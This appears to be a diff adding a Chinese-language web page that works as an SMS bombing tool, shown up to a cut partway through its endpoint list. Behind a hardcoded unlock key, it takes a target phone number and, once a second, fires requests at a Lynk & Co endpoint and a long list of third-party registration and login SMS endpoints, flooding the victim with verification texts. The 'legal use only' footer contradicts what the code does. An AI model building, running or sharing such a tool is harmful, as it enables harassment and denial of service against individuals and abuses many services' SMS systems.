@@ -1,0 +1,945 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>短信验证码工具</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #0a0a2a, #1a1a40);
+            color: #e0e0e0;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+        
+        #fireworks-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+        }
+        
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+            background: rgba(20, 20, 40, 0.85);
+            border-radius: 15px;
+            box-shadow: 0 0 25px rgba(0, 0, 0, 0.6);
+            margin-top: 40px;
+            position: relative;
+            z-index: 1;
+            backdrop-filter: blur(10px);
+        }
+        
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid rgba(79, 195, 247, 0.3);
+        }
+        
+        h1 {
+            color: #4fc3f7;
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            text-shadow: 0 0 15px rgba(79, 195, 247, 0.7);
+        }
+        
+        .subtitle {
+            color: #81d4fa;
+            font-size: 1.1rem;
+        }
+        
+        .auth-section {
+            padding: 20px;
+            background: rgba(30, 30, 60, 0.7);
+            border-radius: 10px;
+            margin-bottom: 25px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #81d4fa;
+            font-weight: bold;
+        }
+        
+        input[type="password"],
+        input[type="text"],
+        input[type="number"],
+        select {
+            width: 100%;
+            padding: 14px;
+            border: 2px solid #333;
+            border-radius: 8px;
+            background: rgba(25, 25, 50, 0.8);
+            color: #fff;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+        
+        input[type="password"]:focus,
+        input[type="text"]:focus,
+        input[type="number"]:focus,
+        select:focus {
+            border-color: #4fc3f7;
+            outline: none;
+            box-shadow: 0 0 10px rgba(79, 195, 247, 0.5);
+        }
+        
+        button {
+            background: linear-gradient(to right, #1976d2, #1565c0);
+            color: white;
+            border: none;
+            padding: 15px 25px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            width: 100%;
+            transition: all 0.3s;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+        }
+        
+        button:hover {
+            background: linear-gradient(to right, #1565c0, #0d47a1);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 8px rgba(0, 0, 0, 0.4);
+        }
+        
+        button:active {
+            transform: translateY(0);
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+        }
+        
+        .btn-stop {
+            background: linear-gradient(to right, #e74c3c, #c0392b);
+        }
+        
+        .btn-stop:hover {
+            background: linear-gradient(to right, #c0392b, #a93226);
+        }
+        
+        .main-section {
+            display: none;
+            padding: 20px;
+            background: rgba(30, 30, 60, 0.7);
+            border-radius: 10px;
+            margin-bottom: 25px;
+        }
+        
+        .control-section {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .status {
+            margin-top: 25px;
+            padding: 15px;
+            border-radius: 8px;
+            background: rgba(40, 40, 80, 0.8);
+            max-height: 300px;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 14px;
+        }
+        
+        .status div {
+            padding: 10px;
+            margin-bottom: 10px;
+            border-radius: 5px;
+        }
+        
+        .success {
+            background: rgba(46, 204, 113, 0.2);
+            border-left: 4px solid #2ecc71;
+            color: #a8e6cf;
+        }
+        
+        .error {
+            background: rgba(231, 76, 60, 0.2);
+            border-left: 4px solid #e74c3c;
+            color: #ffaaa5;
+        }
+        
+        .info {
+            background: rgba(52, 152, 219, 0.2);
+            border-left: 4px solid #3498db;
+            color: #a1cae2;
+        }
+        
+        .warning {
+            background: rgba(241, 196, 15, 0.2);
+            border-left: 4px solid #f1c40f;
+            color: #fdfd96;
+        }
+        
+        .api-count {
+            text-align: center;
+            margin-top: 15px;
+            color: #81d4fa;
+            font-size: 0.9rem;
+        }
+        
+        .stats {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 15px;
+            padding: 10px;
+            background: rgba(40, 40, 80, 0.6);
+            border-radius: 8px;
+        }
+        
+        .stat-item {
+            text-align: center;
+        }
+        
+        .stat-value {
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: #4fc3f7;
+        }
+        
+        .stat-label {
+            font-size: 0.8rem;
+            color: #81d4fa;
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 30px;
+            color: #81d4fa;
+            font-size: 0.9rem;
+            opacity: 0.7;
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                margin: 20px;
+                padding: 15px;
+            }
+            
+            h1 {
+                font-size: 2rem;
+            }
+            
+            .control-section {
+                grid-template-columns: 1fr;
+            }
+            
+            input[type="password"],
+            input[type="text"],
+            input[type="number"],
+            select {
+                padding: 12px;
+            }
+            
+            button {
+                padding: 12px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <canvas id="fireworks-canvas"></canvas>
+    
+    <div class="container">
+        <header>
+            <h1>短信验证码工具</h1>
+            <p class="subtitle">安全验证与短信发送系统</p>
+        </header>
+        
+        <div class="auth-section">
+            <div class="form-group">
+                <label for="key">请输入卡密解锁功能:</label>
+                <input type="password" id="key" placeholder="输入卡密 xiaoan2025">
+            </div>
+            <button id="unlockBtn">解锁工具</button>
+        </div>
+        
+        <div class="main-section" id="mainSection">
+            <div class="form-group">
+                <label for="phone">目标手机号码:</label>
+                <input type="text" id="phone" placeholder="请输入11位手机号码">
+            </div>
+            
+            <div class="control-section">
+                <div class="form-group">
+                    <label for="sendMode">发送模式:</label>
+                    <select id="sendMode">
+                        <option value="count">按发送条数</option>
+                        <option value="time">按发送时间</option>
+                    </select>
+                </div>
+                
+                <div class="form-group" id="countControl">
+                    <label for="sendCount">发送条数:</label>
+                    <input type="number" id="sendCount" min="1" max="1000" value="10">
+                </div>
+                
+                <div class="form-group" id="timeControl" style="display:none">
+                    <label for="sendTime">发送时间(秒):</label>
+                    <input type="number" id="sendTime" min="1" max="3600" value="60">
+                </div>
+            </div>
+            
+            <button id="sendBtn">开始发送验证码</button>
+            <button id="stopBtn" class="btn-stop" style="display:none; margin-top:10px;">停止发送</button>
+            
+            <div class="stats">
+                <div class="stat-item">
+                    <div class="stat-value" id="sentCount">0</div>
+                    <div class="stat-label">已发送</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value" id="successCount">0</div>
+                    <div class="stat-label">成功</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value" id="errorCount">0</div>
+                    <div class="stat-label">失败</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value" id="remainingTime">--</div>
+                    <div class="stat-label">剩余时间</div>
+                </div>
+            </div>
+            
+            <div class="status" id="status">
+                <div class="info">等待操作...功能解锁后即可使用</div>
+            </div>
+            
+            <div class="api-count">系统集成 <strong>200+</strong> 个API接口</div>
+        </div>
+        
+        <footer>
+            <p>© 2023 短信验证码工具 | 仅供合法用途</p>
+        </footer>
+    </div>
+
+    <script>
+        // 烟花背景效果
+        document.addEventListener('DOMContentLoaded', function() {
+            const canvas = document.getElementById('fireworks-canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            
+            let fireworks = [];
+            let particles = [];
+            
+            class Firework {
+                constructor() {
+                    this.x = Math.random() * canvas.width;
+                    this.y = canvas.height;
+                    this.targetY = Math.random() * canvas.height * 0.6;
+                    this.speed = 2 + Math.random() * 2;
+                    this.color = `hsl(${Math.random() * 360}, 100%, 60%)`;
+                    this.radius = 2;
+                    this.reached = false;
+                }
+                
+                update() {
+                    if (!this.reached) {
+                        this.y -= this.speed;
+                        if (this.y <= this.targetY) {
+                            this.reached = true;
+                            this.explode();
+                        }
+                    }
+                }
+                
+                explode() {
+                    for (let i = 0; i < 80; i++) {
+                        const particle = new Particle(this.x, this.y, this.color);
+                        particles.push(particle);
+                    }
+                }
+                
+                draw() {
+                    if (!this.reached) {
+                        ctx.beginPath();
+                        ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
+                        ctx.fillStyle = this.color;
+                        ctx.fill();
+                    }
+                }
+            }
+            
+            class Particle {
+                constructor(x, y, color) {
+                    this.x = x;
+                    this.y = y;
+                    this.color = color;
+                    this.angle = Math.random() * Math.PI * 2;
+                    this.speed = Math.random() * 5 + 1;
+                    this.friction = 0.95;
+                    this.gravity = 0.2;
+                    this.alpha = 1;
+                    this.radius = Math.random() * 2 + 1;
+                }
+                
+                update() {
+                    this.speed *= this.friction;
+                    this.x += Math.cos(this.angle) * this.speed;
+                    this.y += Math.sin(this.angle) * this.speed + this.gravity;
+                    this.alpha -= 0.01;
+                }
+                
+                draw() {
+                    ctx.globalAlpha = this.alpha;
+                    ctx.beginPath();
+                    ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
+                    ctx.fillStyle = this.color;
+                    ctx.fill();
+                    ctx.globalAlpha = 1;
+                }
+            }
+            
+            function animate() {
+                requestAnimationFrame(animate);
+                ctx.fillStyle = 'rgba(10, 10, 30, 0.2)';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                
+                if (Math.random() < 0.03) {
+                    fireworks.push(new Firework());
+                }
+                
+                for (let i = 0; i < fireworks.length; i++) {
+                    fireworks[i].update();
+                    fireworks[i].draw();
+                    
+                    if (fireworks[i].reached && fireworks[i].y > canvas.height) {
+                        fireworks.splice(i, 1);
+                    }
+                }
+                
+                for (let i = 0; i < particles.length; i++) {
+                    particles[i].update();
+                    particles[i].draw();
+                    
+                    if (particles[i].alpha <= 0) {
+                        particles.splice(i, 1);
+                    }
+                }
+            }
+            
+            animate();
+            
+            window.addEventListener('resize', function() {
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+            });
+            
+            // 卡密验证
+            document.getElementById('unlockBtn').addEventListener('click', checkKey);
+            document.getElementById('key').addEventListener('keyup', function(e) {
+                if (e.key === 'Enter') checkKey();
+            });
+            
+            // 发送模式切换
+            document.getElementById('sendMode').addEventListener('change', function() {
+                if (this.value === 'count') {
+                    document.getElementById('countControl').style.display = 'block';
+                    document.getElementById('timeControl').style.display = 'none';
+                } else {
+                    document.getElementById('countControl').style.display = 'none';
+                    document.getElementById('timeControl').style.display = 'block';
+                }
+            });
+            
+            // 发送验证码
+            document.getElementById('sendBtn').addEventListener('click', startSending);
+            document.getElementById('stopBtn').addEventListener('click', stopSending);
+        });
+        
+        // 全局变量
+        let isSending = false;
+        let sendingInterval = null;
+        let remainingTime = 0;
+        let sentCount = 0;
+        let successCount = 0;
+        let errorCount = 0;
+        
+        // 生成当前时间戳（适配需时间戳的接口）
+        function getTimeStamp() {
+            return Date.now();
+        }
+        
+        // 生成随机数（适配广东联通等需随机数的接口）
+        function getRandom() {
+            return Math.random().toFixed(16);
+        }
+        
+        // 检查卡密
+        function checkKey() {
+            const key = document.getElementById('key').value;
+            if (key === 'xiaoan2025') {
+                document.getElementById('mainSection').style.display = 'block';
+                addStatusMessage('验证成功，功能已解锁', 'success');
+            } else {
+                addStatusMessage('卡密错误，请重新输入', 'error');
+            }
+        }
+        
+        // 添加状态消息
+        function addStatusMessage(message, type) {
+            const statusDiv = document.getElementById('status');
+            const messageDiv = document.createElement('div');
+            messageDiv.className = type;
+            messageDiv.textContent = message;
+            statusDiv.insertBefore(messageDiv, statusDiv.firstChild);
+            
+            // 限制消息数量
+            if (statusDiv.children.length > 50) {
+                statusDiv.removeChild(statusDiv.lastChild);
+            }
+        }
+        
+        // 开始发送
+        function startSending() {
+            const phone = document.getElementById('phone').value;
+            if (!phone || !/^1[3-9]\d{9}$/.test(phone)) {
+                addStatusMessage('请输入有效的手机号码', 'error');
+                return;
+            }
+            
+            const sendMode = document.getElementById('sendMode').value;
+            if (sendMode === 'count') {
+                const sendCount = parseInt(document.getElementById('sendCount').value);
+                if (isNaN(sendCount) || sendCount < 1) {
+                    addStatusMessage('请输入有效的发送条数', 'error');
+                    return;
+                }
+                startCountSending(phone, sendCount);
+            } else {
+                const sendTime = parseInt(document.getElementById('sendTime').value);
+                if (isNaN(sendTime) || sendTime < 1) {
+                    addStatusMessage('请输入有效的发送时间', 'error');
+                    return;
+                }
+                startTimeSending(phone, sendTime);
+            }
+        }
+        
+        // 按条数发送
+        function startCountSending(phone, totalCount) {
+            if (isSending) return;
+            
+            isSending = true;
+            sentCount = 0;
+            successCount = 0;
+            errorCount = 0;
+            
+            document.getElementById('sendBtn').style.display = 'none';
+            document.getElementById('stopBtn').style.display = 'block';
+            document.getElementById('sentCount').textContent = '0';
+            document.getElementById('successCount').textContent = '0';
+            document.getElementById('errorCount').textContent = '0';
+            document.getElementById('remainingTime').textContent = '--';
+            
+            addStatusMessage(`开始向 ${phone} 发送 ${totalCount} 条验证码...`, 'info');
+            
+            // 开始发送
+            sendingInterval = setInterval(() => {
+                if (sentCount >= totalCount) {
+                    stopSending();
+                    addStatusMessage(`已完成 ${totalCount} 条短信发送`, 'success');
+                    return;
+                }
+                
+                sendAllRequests(phone);
+                sentCount++;
+                document.getElementById('sentCount').textContent = sentCount;
+            }, 1000);
+        }
+        
+        // 按时间发送
+        function startTimeSending(phone, totalTime) {
+            if (isSending) return;
+            
+            isSending = true;
+            sentCount = 0;
+            successCount = 0;
+            errorCount = 0;
+            remainingTime = totalTime;
+            
+            document.getElementById('sendBtn').style.display = 'none';
+            document.getElementById('stopBtn').style.display = 'block';
+            document.getElementById('sentCount').textContent = '0';
+            document.getElementById('successCount').textContent = '0';
+            document.getElementById('errorCount').textContent = '0';
+            document.getElementById('remainingTime').textContent = remainingTime;
+            
+            addStatusMessage(`开始向 ${phone} 发送验证码，持续 ${totalTime} 秒...`, 'info');
+            
+            // 开始发送
+            sendingInterval = setInterval(() => {
+                if (remainingTime <= 0) {
+                    stopSending();
+                    addStatusMessage(`已完成 ${totalTime} 秒的短信发送`, 'success');
+                    return;
+                }
+                
+                sendAllRequests(phone);
+                sentCount++;
+                remainingTime--;
+                
+                document.getElementById('sentCount').textContent = sentCount;
+                document.getElementById('remainingTime').textContent = remainingTime;
+            }, 1000);
+        }
+        
+        // 停止发送
+        function stopSending() {
+            if (sendingInterval) {
+                clearInterval(sendingInterval);
+                sendingInterval = null;
+            }
+            
+            isSending = false;
+            document.getElementById('sendBtn').style.display = 'block';
+            document.getElementById('stopBtn').style.display = 'none';
+            
+            addStatusMessage('发送已停止', 'info');
+        }
+        
+        // 发送所有请求：保留领克接口 + 全部添加用户提供的接口
+        async function sendAllRequests(phone) {
+            // 1. 保留1个领克接口
+            const lynkcoApi = {
+                url: `https://app-services.lynkco.com.cn/auth/mp/uc/send-Sms?mobile=${phone}&appId=wx4e8c1172fe132106`,
+                method: 'GET',
+                headers: { 'Content-Type': 'application/json' }
+            };
+            
+            // 2. 用户提供的所有公开接口模板（按用户提供的列表完整添加）
+            const userApiTemplates = [
+                "http://www.bestcake.com/json.ashx?v=&m=sendPhoneCode&c=Reg&phone=",
+                "http://m.meilele.com/solr_api/captcha/mobileCaptcha/create_send_captcha.do?captchaType=mobileLogin&phoneNumber=",
+                "http://m.secoo.com/mobileservice/user/send_phone_reg_validatenum?callback=jsonp1&phone=",
+                "http://58suyun.58.com/pc/suyun/validate?mobile=",
+                "http://api.beibei.com/mroute.html?method=beibei.user.code.send&key=register&tel=",
+                "http://www.yohobuy.com/passport/register/authcode?area=86&mobile=",
+                "http://ershou.paipai.com/user/getVerifyCode?t={timeStamp}&sig=&callback=sendVerifyCodeCallBack&_={timeStamp}&mobile=",
+                "http://m.gome.com.cn/index.php?ctl=ucenter&act=getUserRegisterPhoneCode&mobile=",
+                "https://8.gd10010.cn/p/userRegisterSendSms?r={random}&MBL_NO=",
+                "http://vip.gd10010.cn/vip/user/verifyCode.do?env=wap&username=",
+                "http://m.10086.cn/wireless/jsp/N/z/user.jsp?_a=getCode&mobile=",
+                "http://i.zhaopin.com/Login/LoginApi/SendBindSms?jsoncallback=jQuery16402676061029242586_1454143948438&businessType=C-Bind&t={timeStamp}&_={timeStamp}&mobile=",
+                "http://www.chinahr.com/modules/jsperson/reg.php?action=phoneCaptch&mobile=",
+                "http://m.zhaopin.com/account/getmobileverification?mobile=",
+                "http://www.wsngo.com/reg/sendSmsCheck.html?phone=",
+                "http://hf.tibet.cn/cr_code.php?phone_num=",
+                "http://m.wepiao.com/cgi/User/SendCheckCode?origin=&mobile=",
+                "http://123.taohuiw.com/reg_yzm.php?phone=",
+                "http://shop.sino-life.com/SL_EFS/memberRegister/sendRegistSmsCode.do?mobile=",
+                "http://hd.jiedaibao.com/promotion/send-verify-code?icode=GQ9KBF3&from=h5&mobile=",
+                "http://www.qianwang365.com/uc/ajax/obtainSecurityCode4Regist.html?qianwangWebMonitor=&type=qb&username=",
+                "http://sz.esf.sina.com.cn/ajax/sendmsg?phone=",
+                "http://open.leju.com/game/member/sendcode.html?phone=",
+                "http://pay.xiaojukeji.com/api/v2/p_getsmscode?smstype=0&source=3&openid=2088012451850013&source=alipay_wallet&channel=1300&datatype=webapp&homepage=&phone=",
+                "http://user.tgbus.com/api/action.ashx?callback=callback10491710835861462&t=sendsms&format=json&Action=0&phone=",
+                "https://passport.bankcomm.com/ajax.php/?a=sendvcode?binding=0&uname=",
+                "https://u.yijiedai.com/register/getmobile/mobile/",
+                "http://id.ourgame.com/mobilepassport!getMobileYzm.do?passport=",
+                "http://www.nongyisheng.com/sms/code?fr=pc&token=false&phone=",
+                "http://passport.lotour.com/reg/sendPhoneCode?callback=&_=&&mobile=",
+                "http://www.renwutao.com/member/SendVerifyCode?username=",
+                "http://www.youxia.cn/go/index.php?mod=account&code=getRandCode&pic_code=undefined&phone=",
+                "http://www.fenqida.com/user.php?act=get_msg&1445158368&smsMob=",
+                "http://my.ikang.com/loginUserReg/getGenerateCode?phone=",
+                "http://passport.jcard.cn/Service/AjaxSendCodeService.aspx?doType=sendextcode&_=1445158370&mobile=",
+                "http://www.cgv.com.cn/mem/getRegCapCha.fo?MOBILE_NO=",
+                "http://i.360.cn/smsApi/sendsmscode?condition=2&r=&callback=&account=",
+                "http://www.12320bst.com/beston/home/show!sendPhoneVerificode.action?principalVo.mobile=",
+                "http://www.super8.com.cn/Ajax/HotelInterface.ashx?action=sendmsg&mobile=",
+                "http://www.ybpx.com/shop/index.php?act=login&op=sendmbcode&mobile=",
+                "http://shanghai.ybpx.com/shop/index.php?act=login&op=sendmbcode&mobile=",
+                "http://www.udache.com/app/mQuickReg/getSmsCode?phone=",
+                "http://uc.gh.play.cn/ajax/CommonHander.ashx?random=0.09246630873531103&Action=getLoginMobileCode&Mobile=",
+                "http://m.cardbaobao.com/sendsms!ajaxSendsms.do?from=login&mobile=",
+                "http://passport.ks5u.com/RPAjax.ashx?Param=009&PhoneNum=",
+                "http://yuyue.amcare.com.cn/index.php?r=site/verifycode&mobile=",
+                "http://pan.duobao369.com/auth/send_register_sms?phone=",
+                "http://www.sougetx.com/register/sendMessage.html?mobile=",
+                "http://passport.kongzhong.com/ajax/regsmscode?t=0.8489469729778012&imgcode=vysa&bdFlag=0&phone=",
+                "http://www.xyqb.com/LKB/lg/sendSms.html?random=&loginName=",
+                "http://m.yodbank.com/ajax/verify/yunCode/?type=voice&phoneNumber=",
+                "http://m.feifei.com/api/usercenter/SendTelephoneMsg?telephone=",
+                "http://api.9f.cn/activity/sendVerificationCode2?mobile=",
+                "http://www.yichuangtianji.com/member.php?a=sms&_=1445158338&dianhua=",
+                "http://passport.csdn.net/account/mobileregister?action=sendMobileCode&mobile=",
+                "http://a.xcar.com.cn/bbs/dialog.php?daction=register&drequest=check&chash=ZuXty1HoAbfduG8MIMA2O53l&dhash=N7numlHsAbbf5hAGcbc&ehash=ZO%2B6mFrpB77Uv24KcMJmPpi0oTCxsaUtNQa9KWIYNzYJ3WVcKC%2B%2FCA&phone=",
+                "http://passport.58.com/mobileauthcodelogin/getcode?validatecode=?=true&source=m-my&callback=jsonp_callback2&mobile=",
+                "http://splus.bianfeng.com/index.php?r=findAccount/SendCode&rnd=&a=",
+                "http://www.chinagoldcoin.net/views/contents/member/register/user_register_sendSMS.jsp?status=1&mobile=",
+                "http://m.maijia.com/user/identifycode?template=1&mobile=",
+                "http://reg.uuyoyo.com/AshxHandler/AjaxRegHandler.ashx?action=reg_phone_code_send&_=&phone=",
+                "http://m.sjq.cn/index.php?app=phone_captcha&type=checkcaptcha&ajax=1&phone_mob=",
+                "http://www.qiyeku.com/smsphonework.ashx?keyvalue=",
+                "http://pass.hujiang.com/Handler/UCenter?action=SendMsg&callback=&imgCode=&token=&_=&mobile=",
+                "http://u.panda.tv/ajax_send_register_sms?_jp=&_=&mobile=",
+                "http://clife.5i84.cn/register/sendCode?type=0&mobile=",
+                "http://passport.qufenqi.com/verify/getphonecode?action=regist&verirycode=&mobile=",
+                "http://m.jianshe99.com/m_member/member/mobile_register/resendMsg.shtm?jsonpCallback=&_=&mobilePhone=",
+                "http://i.kuwo.cn/US/2014/api/send_sms.jsp?mobile=",
+                "http://zb.ihiyo.com/welcome/get_phone_verify_code?phone=",
+                "http://wskh.newone.com.cn/newlogincontroller/getrandompassword?mobile=",
+                "http://m.huibo.com/register/getAuthCode?txtPhone=",
+                "http://www.lamall.com/user/sendsmscode?jsonpCallback=$.jsonp.jsonp1445158351&mobile=",
+                "http://member.dongao.com/ma/reg_sms.html?type=reg&mobile=",
+                "http://i.gongchang.cn/mod/user/reg/SendMobile.php?callback=&_=&phone=",
+                "http://m.51auto.com/ajax/sendmessage?mobile=",
+                "http://mam.sdo.com/index.php?m=Surround&a=sendmsg&phoneid=",
+                "http://2.figbank.com/sendCode?cellphone=",
+                "http://www.metromall.cn/user/MobileCode.aspx?randnum=&Phone=",
+                "http://ah181.huilongkj.com/vs/login.jsp?from=null&m=%E9%AA%8C%E8%AF%81%E7%A0%81%E5%B7%B2%E5%8F%91%E9%80%81%EF%BC%8C%E8%AF%B7%E6%B3%A8%E6%84%8F%E6%9F%A5%E6%94%B6.&p=",
+                "http://hd.wows.kongzhong.com/nczige?jsonpcallback=jQuery1830020803913939744234_1432306497430&op=sendcode&_=1445158362&phone=",
+                "http://api.sssc.cn/seccode/reg?callback=&m=",
+                "http://m.u17.com/authorization/validationMobile?mobile=",
+                "http://m.ymatou.com/register/getmobileverifycode?mobile=",
+                "http://www.xiachufang.com/auth/send_verify_code/?via=apply&tel=",
+                "http://www.rgjr.cn/subject/getMessageCode?phone=",
+                "http://m.qinqinbaby.com/home/passport/sendSmsCode?mobile=",
+                "http://m.epweike.com/sendcode.html?mobile=",
+                "http://www.hi8d.com/app/login.php?action=getcode&timestamp=&phone=86",
+                "http://m.juanpi.com/user/ajax?action=send_code&mobile=",
+                "http://m.tiantian.com/login/userReg?Ajax_CallBack=true&_=&Ajax_CallBackType=BizControls.login.LoginOrRegAjaxControl&Ajax_CallBackMethod=SendUserSms&Ajax_CallBackArgument0=",
+                "http://login.tiantian.com/new/reg/?Ajax_CallBack=true&_=&Ajax_CallBackType=BizControls.login.LoginOrRegAjaxControl&Ajax_CallBackMethod=SendUserSms&Ajax_CallBackArgument0=",
+                "http://reg.shenghuo.com/register/_sendMsg?phonenum=",
+                "http://bbs.wangdaizhijia.com/api/app/json.php?type=sms_verify_wap&csrf_test_name=&cellphone_number=",
+                "http://www.huijinxin.com/SendRegisterValidation?phone=",
+                "http://www.sfbuy.com/account/sendVcodeMsg?mobile=",
+                "http://www.wacai.com/finance/regist_sms.action?mob=",
+                "http://www.i9tou.com/PtlVCode!apply.action?nosession=true&tel=",
+                "http://m.sto.cn/Ali/index.php?s=/home/Main/get_mobile_code?mobileNo=",
+                "http://passport.capitaland.com.cn/handles/ValiDatePhone.ashx?returnUrl=&vip_mall_id=0&action=GetRetister_Code&phone_num=",
+                "http://account.tongbanjie.com/wap/register/sendverificationcode.json?phone=",
+                "http://t.dianping.com/ajaxcore/newregister?action=sendVerify&phone=",
+                "http://www.yhspj.com/homeLogin_sendSms.action?user.tel=",
+                "http://yixin.im/api/dlfromsms?mobile=",
+                "http://bbs.cz001.com.cn/register/index.php?action=send_auth&mobile=",
+                "http://s.boqii.com/vetapi.php?UDID=&Act=SendAuthCode&Account=",
+                "http://www.szhb8.net/sms?phone=",
+                "http://m.vvipone.com/h5/driver/captcha2.html?langType=zh-CN&country_code=86&phone=",
+                "http://www.iyishengyuan.com/?_a=getValidateMessage&ajax_msg=1&voice=1&mobile=",
+                "http://www.yuexiangjie.com/webshop!setRestPhone.action?phone=",
+                "http://www.4008123123.com/phhs_ios/customerSmsCode.action?mobileNum=",
+                "http://www.4008823823.com.cn/kfcios//customerSmsCode.action?mobileNum=",
+                "http://reg.sbkookxiang.com/api/SendSMS.php?p=",
+                "http://guangzhou.rongmaicn.com/plugin/sms.php?mobile=",
+                "http://b.rrr.me/web/user/get_captcha?mobile=",
+                "http://cz.lingnanpass.com/lntcz/reg-sendCode.do?phone=",
+                "http://www.aizhuan.org/sms/index.php?phoneNumber=",
+                "http://pc.uhouzz.com/index.php/wechatapp/User/sendRegisterVerifyCode?src=pc&username=",
+                "http://m.huizhaofang.com/securityCode/?output_type=json&phone=",
+                "http://www.bbt100.cn/fget_phone_code?phone=",
+                "http://www.kejuwang.com/user/sendCode/phone?phone=",
+                "http://www.91wutong.com/user/sendSmsCode.ajax?type=1&mobileNo=",
+                "http://web.labifenqi.com/pcserver//user/dynCode?phone=",
+                "http://bbs.niu.com/member.php?mod=sendcode&type=1&mobile=",
+                "http://www.1tjob.com/ODJ/getMobileCheckCode!getMobileCheckCode.action?user.mobile=",
+                "http://static.jjwxc.net/register/register.php?action=getRegisterCode&mobile=",
+                "http://www.oocheoo.com/user_login/get_code.html?phone=",
+                "http://reg.exam8.com/Inc/CheckMoblieCode.asp?Action=CheckMobileCode&SendMobile=",
+                "http://www.xuebagongchang.com/sms/sms_send.php?param1=0&tel=",
+                "http://my.rrkd.cn/Ajax/GetMobileCode.aspx?loginname=",
+                "http://www.52pcb.com/user/sendTelCode.do?tel=",
+                "http://www.open.com.cn/tools/submit_ajax.ashx?action=user_register_message&c=f&UserName=",
+                "http://user.fenlei168.com/C_site/?v=register&membertel=",
+                "http://m.s.cn/user/mobi_code/?accountname=",
+                "http://m.cang.com/Register_phone.aspx?callback=&post_action=sentcode&R_Phone=",
+                "http://www.taskp.com/wap/user/send_verify?code=&tel=",
+                "http://www.168licai.cn/?ajax&q=phone_reg&type=send&phone=",
+                "http://cfq.xianshuabao.com:8080/sendverifycode?phone=",
+                "http://wap.yunxin123.com/index.php?register&phone=",
+                "http://mall.chinayanghe.com/m/login/sendRandomPassword?telephone=",
+                "http://m.7881.com/commerical/sendPhoneValid.action?tel=",
+                "http://www.tchappy.com/user_base/ajaxGetValicode.html?telphone=",
+                "http://www.qianxing3c.com/Login/sendVerify.html?type=1&username=",
+                "http://www.yatiku.com/Shortmessage/sendMsgBind?tel=",
+                "http://www.hdb.com/post/api:4?send_type=0&send_address=",
+                "http://www.jiangduoduo.com/action/site/SearchMessage.ashx?action=sm&Mobile=",
+                "http://www.sdhoo.com/web/account/do_sendregist_sms_js.html?cellphone=",
+                "http://www.jiancaifirst.com/public/sendcode.html?mobile=",
+                "http://www.xiao123.com/e/extend/phonekey/index.php?enews=addkey&phone=",
+                "http://www.ybvv.com/plugin.php?id=mobregister:getsmscode&ac=sendmsg&mobile=",
+                "http://www.371qq.com/register_phone.aspx?action=getmobilecertifycode&Mobile=",
+                "http://www.wanghouxiongedu.com/User/ARandomCode.html?mode=2&Mobile=",
+                "http://www.shanjin365.com/?user&q=phone_reg&phone=",
+                "http://www.shunfengdj.cn/sfdjweb/user/app-regist.action?phone=",
+                "http://wap.7lk.com/user/send-sms?from=register&mobile_phone=",
+                "http://m.chilicai.com/mobileManage_sendKey.action?mobileNo=",
+                "http://vip.52njl.com/Login/GetValidateCode?txtphone=",
+                "http://www.8868.cn/sendCaptcha?ran=&t=1&v=",
+                "http://mall.chinayanghe.com/login/sendRandomPassword?telephone=",
+                "http://m.mangocity.com/api/index.php?c=member&m=sentsms&loginSubTyp=M&loginName=",
+                "http://sh.fang.anjuke.com/ajkfinance/ajax/mobilecode?phone=",
+                "http://www.idting.com/User/Register/sendMobileCode?mobile_number=",
+                "http://www.lift-world.com/user/viewuser/VerifUserID?Userid=",
+                "https://kh.eastmoney.com/Submit/GetVerificationCode?yzm=&mobileNumber=",
+                "https://pay.suning.com/epp-epw/useraccount/reg/sendMobileValidateCode.action?username=",
+                "http://www.longfeng.com/login.html?opt=send_phone&phone=",
+                "http://www.hengqijy.com/index.php?m=member&c=fmcode&a=getPhoneCode&res=getPhoneCode&phone=",
+                "http://www.cfyd168.com/ajaxapi.php?key=&t=2&a=CheckCode&mo=",
+                "https://www.11186.com/validRegPhone?phone=",
+                "https://www.11186.com/send_reg_code?phone=",
+                "http://dealer.che168.com/Handler/DealerApply/DelaerRegister.ashx?Method=GetRegisterCode&mobile=",
+                "http://www.kmall.so/tools/submit_ajax.ashx?action=user_register_smscode&password=951623&username=qq951623&mobile=",
+                "http://www.meipai.com/users/smsdownload?from=&mobile=",
+                "https://zhuce.xunlei.com/regapi?response=cookie&type=1&from=RG_1&op=sendSms&mobile=",
